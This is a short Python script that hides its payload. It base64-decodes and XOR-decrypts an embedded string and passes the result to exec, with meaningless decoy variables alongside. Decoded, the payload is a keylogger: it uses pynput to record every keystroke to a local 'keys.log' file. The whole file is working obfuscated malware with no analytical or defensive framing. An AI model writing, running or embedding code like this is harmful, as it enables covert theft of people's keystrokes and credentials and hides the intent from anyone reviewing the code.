
import base64
dGOfkkRQ = 1036
iOmtFXHh = 'foo'

def decrypt(code, key):
    decoded = base64.b64decode(code).decode()
    return ''.join([chr(ord(c) ^ key) for c in decoded])

exec(decrypt('Y3dqaCV1fGt1cHElbGh1andxJW5gfGdqZHdhDw9hYGMlamtadXdgdnYtbmB8LD8PJSUlJXF3fD8PJSUlJSUlJSVybHFtJWp1YGstJ25gfHYraWpiJyklJ2QnLCVkdiVjPw8lJSUlJSUlJSUlJSVjK3J3bHFgLW5gfCtmbWR3LA8lJSUlYH1mYHVxJURxcXdsZ3BxYEB3d2p3Pw8lJSUlJSUlJXJscW0lanVgay0nbmB8ditpamInKSUnZCcsJWR2JWM/DyUlJSUlJSUlJSUlJWMrcndscWAtYydefm5gfHhYJywPD2FgYyV2cWR3cVppamJiYHctLD8PJSUlJXJscW0lbmB8Z2pkd2ErSWx2cWBrYHctamtadXdgdnY4amtadXdgdnYsJWR2JWlsdnFga2B3Pw8lJSUlJSUlJWlsdnFga2B3K29qbGstLA8PdnFkd3FaaWpiYmB3LSwPDw8P', 5))

